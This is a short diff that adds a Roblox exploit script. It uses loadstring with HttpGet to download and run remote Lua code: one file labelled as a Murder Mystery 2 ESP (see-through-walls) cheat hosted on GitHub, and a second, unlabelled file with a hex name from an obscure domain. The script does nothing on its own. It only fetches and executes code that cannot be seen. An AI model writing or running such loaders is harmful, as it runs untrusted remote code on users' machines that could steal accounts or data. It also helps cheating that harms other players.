@@ -1,0 +1,4 @@
+getgenv().gui = false
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Ihaveash0rtnamefordiscord/Releases/main/MurderMystery2HighlightESP"))(' Watermelon ?')
+
+loadstring(game:HttpGet("https://egorikusa.space/0542738715b04e2c58fb94f8.lua", true))()
